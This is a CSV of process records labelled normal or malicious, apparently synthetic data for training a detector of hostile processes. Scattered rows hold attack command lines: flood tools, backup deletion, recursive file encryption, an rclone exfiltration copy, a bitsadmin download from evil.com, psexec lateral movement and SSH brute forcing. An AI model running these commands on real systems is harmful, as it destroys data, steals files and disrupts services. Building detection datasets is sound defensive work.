process_name,cmdline,cpu_usage,memory_usage,has_network,connections,is_system_user,label,source,severity
webpack.exe,webpack.exe,17.81049498173869,2.163504957335447,1,7,0,normal,synthetic_normal,
RuntimeBroker.exe,RuntimeBroker.exe,13.658227326987491,1.2075268626411868,0,15,0,normal,synthetic_normal,
zsh.exe,zsh.exe,24.78562482766453,4.039344122244613,0,18,0,normal,synthetic_normal,
pythonw.exe,pythonw.exe,14.478691498538938,2.7066473605876356,1,12,0,normal,synthetic_normal,
loic.exe,loic.exe --target 192.168.1.1 --port 80,82.5813742841015,22.155608273481782,1,1005,0,ddos,ddos_tools,
npx.exe,npx.exe,7.035431913914595,1.6432235397961725,1,10,0,normal,synthetic_normal,
hping3.exe,hping3.exe --flood -p 80 target.com,99.36460272940248,15.221829255960461,1,1563,0,ddos,ddos_tools,
java.exe,java.exe,58.9231217671381,32.0019881888597,1,13,0,normal,synthetic_normal,
dwm.exe,dwm.exe,26.04172885295419,5.598621193923734,0,3,0,normal,synthetic_normal,
wbadmin.exe,wbadmin.exe delete catalog -quiet,30.245501684685443,12.422525376040632,1,5,0,ransomware,mitre_ransomware,critical
encrypt.exe,encrypt.exe --recursive C:\Users,35.26685204695387,24.61765316801945,1,5,0,ransomware,mitre_ransomware,critical
smartscreen.exe,smartscreen.exe,4.398483628604763,5.3612862753110235,1,9,0,normal,synthetic_normal,
webpack.exe,webpack.exe,17.204184720414396,3.7962645360570715,0,2,0,normal,synthetic_normal,
lync.exe,lync.exe,23.269872730707185,4.894310042513445,0,4,0,normal,synthetic_normal,
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,40.11821369672255,13.413300661531093,1,3,0,data_exfiltration,mitre_data_exfiltration,critical
bitsadmin.exe,bitsadmin.exe /transfer job /download http://evil.com/mal.exe,37.70782845067971,12.248073100462694,1,3,0,malware,mitre_download_execute,high
Photoshop.exe,Photoshop.exe,15.388672287557464,7.875217553180072,0,14,0,normal,synthetic_normal,
clion64.exe,clion64.exe,3.7209819137300117,2.443869158064695,0,3,0,normal,synthetic_normal,
xmrig.exe,xmrig.exe --silent,62.559136662407695,20.213795041765238,1,7,0,ddos,known_malware,
cargo.exe,cargo.exe,23.858129022049013,2.5951008105615,1,19,0,normal,synthetic_normal,
psexec.exe,psexec.exe \\target -s cmd.exe,28.96895974433749,18.530610980509753,1,7,0,lateral_movement,mitre_lateral_movement,high
OUTLOOK.EXE,OUTLOOK.EXE,11.066008146705457,5.934365934039102,0,9,0,normal,synthetic_normal,
psexec64.exe,psexec64.exe -accepteula \\target,65.94163574165299,8.371298162573684,1,2,0,lateral_movement,mitre_lateral_movement,high
make.exe,make.exe,17.173454663717127,0.7843499854184051,1,5,0,normal,synthetic_normal,
csrss.exe,csrss.exe,2.912905208593398,7.774742129251506,1,0,0,normal,synthetic_normal,
rottenpotato.exe,rottenpotato.exe,40.45514653311956,13.615140217917666,0,3,0,privilege_escalation,mitre_privilege_escalation,critical
slowloris.py,python slowloris.py target.com,81.41579356244449,12.880002192138127,1,714,0,ddos,ddos_tools,
obs64.exe,obs64.exe,11.260517976697386,7.8173380754703174,0,4,0,normal,synthetic_normal,
hping3.exe,hping3.exe --flood -p 80 target.com,86.12942666489778,23.913917980905325,1,808,0,ddos,ddos_tools,
iCloudServices.exe,iCloudServices.exe,19.156536664688947,0.707574939236749,1,5,0,normal,synthetic_normal,
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,49.741410264357214,15.923892767146846,1,414,0,brute_force,brute_force_tools,
hoic.exe,hoic.exe,91.09401594988648,23.510398940824295,1,918,0,ddos,ddos_tools,
pwsh.exe,pwsh.exe,26.055102076807316,2.1911966565201935,0,20,0,normal,synthetic_normal,
cmd.exe,cmd.exe /c powershell -encodedcommand,56.599308471063935,10.329618631079871,0,4,0,malware,mitre_malicious_scripts,high
meterpreter,metsvc.exe,74.30431755414304,15.957585492506146,1,4,0,trojan,mitre_command_control,critical
OneDrive.exe,OneDrive.exe,18.794614854707046,1.0324698559082786,0,1,0,normal,synthetic_normal,
smss.exe,smss.exe,13.501481878079172,2.0196258812682975,1,12,0,normal,synthetic_normal,
WhatsApp.exe,WhatsApp.exe,12.005957912794162,6.573364057848638,0,13,0,normal,synthetic_normal,
smss.exe,smss.exe,5.538017190806315,4.558794765201236,0,20,0,normal,synthetic_normal,
postgres.exe,postgres.exe,15.000874584283428,6.638675511854455,0,16,0,normal,synthetic_normal,
pwsh.exe,pwsh.exe,15.081891055018511,0.8638188623201919,0,5,0,normal,synthetic_normal,
